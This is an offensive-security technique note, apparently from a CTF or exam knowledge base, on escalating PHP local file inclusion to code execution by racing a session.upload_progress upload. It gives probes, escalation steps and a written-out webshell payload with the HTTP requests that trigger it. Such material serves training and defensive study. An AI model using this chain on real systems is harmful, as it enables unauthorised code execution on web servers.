---
doc_kind: pattern
title: "PHP session.upload_progress Race Condition LFI-to-RCE"
category: web
slug: php-session-upload-progress-lfi-rce
created: 2026-11-09
status: active
tags:
  - lfi
  - rce
  - race-condition
  - php
  - session-upload-progress
chain_summary: "When allow_url_include=Off blocks data:// or php://input and logs are unreadable, race a slow multipart upload (PHP_SESSION_UPLOAD_PROGRESS payload) against a parallel LFI include of the session file"
---
# PHP session.upload_progress Race Condition LFI-to-RCE

## Chain Summary

- One-line chain: When `allow_url_include=Off` blocks `data://`/`php://input` and Apache logs are
  unreadable, race a slow multipart upload (payload in `PHP_SESSION_UPLOAD_PROGRESS`) against a parallel
  LFI `include()` of the resulting session file before PHP finishes/cleans it up.
- Typical target shape: a PHP app with an unauthenticated `include($_GET['page'])`-style LFI, confirmed
  `allow_url_include=Off`, and no readable log files (Apache logs usually `root:adm`, web user not in
  `adm`).

## Preconditions

- Confirmed LFI (arbitrary local file inclusion via a GET/POST param, ideally with no extension
  auto-appended so absolute paths and PHP wrappers work).
- `allow_url_include=Off` (rules out `data://` and `php://input` for direct code execution via include).
- PHP's session extension active (default) — `session.upload_progress.enabled` does NOT need to be
  explicitly `On` in php.ini; PHP's built-in default is On even when the directive is commented out/absent.
- Does NOT require the application to call `session_start()` anywhere — upload-progress tracking hooks
  multipart request parsing directly at the SAPI/extension level, independent of app-level session usage.
- Session save path must be readable by the same user that runs the web server (default
  `/var/lib/php/sessions`, created with that user's own ownership — always true when PHP itself creates it).

## Cheap Probes

- Read php.ini via the LFI itself first: `?page=php://filter/convert.base64-encode/resource=/etc/php/<ver>/apache2/php.ini`
  (try common version numbers: 8.4, 8.3, 8.2, 8.1, 8.0, 7.4) and grep for `allow_url_include`,
  `allow_url_fopen`, `disable_functions`, `display_errors`.
- Confirm log files are unreadable before falling back to this technique: try
  `?page=/var/log/apache2/access.log` and check it actually returns content, not just a 200 with the normal
  page template (an `include()` failure is often silent — no PHP warning shown if `display_errors=Off`).
- `?page=/etc/group` to confirm the web user (usually `www-data`) is not in `adm`.

## Telltale Evidence

- `data://` / `php://input` test payloads produce no output (not even an error) when
  `allow_url_include=Off` — this is the trigger to switch techniques, not a dead end.
- `session.save_path` commented out in php.ini → default `/var/lib/php/sessions` applies.

## Escalation Order

1. Confirm LFI and `allow_url_include=Off` (rules out the simpler wrapper-based RCE).
2. Confirm log files unreadable (rules out log poisoning).
3. Build a slow multipart POST: first field `PHP_SESSION_UPLOAD_PROGRESS` = PHP payload
   (`<?php system($_GET["c"]); ?>`), second field a file upload with several MB of filler data streamed in
   small chunks with short sleeps between them (keeps the session file populated on disk for longer).
4. Set a cookie `PHPSESSID=<chosen id>` on that same POST request.
5. In parallel (a second thread/process), loop a GET request:
   `?page=/var/lib/php/sessions/sess_<chosen id>&c=<command>` with the same `PHPSESSID` cookie, until the
   response contains real command output instead of the raw serialized session array.
6. Once RCE is confirmed (`id` → web user), use it for the rest of the recon/privesc chain instead of
   re-racing for every command — e.g. drive it through a small reusable script (one race attempt per
   command) rather than opening a reverse shell (often unnecessary and adds exfil complexity for an outbound
   firewall).

## Common Mistakes

- Giving up on RCE entirely once `data://`/`php://input` fail — `allow_url_include=Off` only blocks
  wrapper-based direct code inclusion, not this technique.
- Not slowing the upload down enough — a fast upload completes (and the session file's upload-progress
  entry gets cleaned up) before the parallel LFI request can land; a few MB dripped in small chunks with
  short sleeps gives a wide enough window on a typical box.
- Forgetting to set the same `PHPSESSID` cookie on both the upload request and the LFI include request —
  the session filename is derived from that cookie value, so they must match exactly.
- Not accounting for `session.auto_start=0` as a blocker — it is NOT a blocker for this specific technique,
  only for techniques that need the app to call `session_start()` itself.

## Payload Shapes

```text
POST / HTTP/1.1
Content-Type: multipart/form-data; boundary=----boundary123
Cookie: PHPSESSID=evilsess

------boundary123
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system($_GET["c"]); ?>
------boundary123
Content-Disposition: form-data; name="file"; filename="x.txt"
Content-Type: text/plain

<...several MB, streamed slowly...>
------boundary123--

# raced in parallel, same cookie:
GET /?page=/var/lib/php/sessions/sess_evilsess&c=id HTTP/1.1
Cookie: PHPSESSID=evilsess
```

## Related Writeups

- [[thundercipher-tcvapt-phantom]] — full worked example, including the reusable Python script
  (`workspaces/thundercipher-tc-vapt-exam/artifacts/race_lfi.py`).

## Skill Impact

- Related skill: `web-triage` / `ctf-web` (LFI escalation ladder).
- Rule to add or update: when LFI is confirmed but `allow_url_include=Off` and logs are unreadable, add
  this race-condition technique as the next rung on the LFI→RCE escalation ladder, before giving up or
  resorting to SSH brute force / lateral movement from another box.
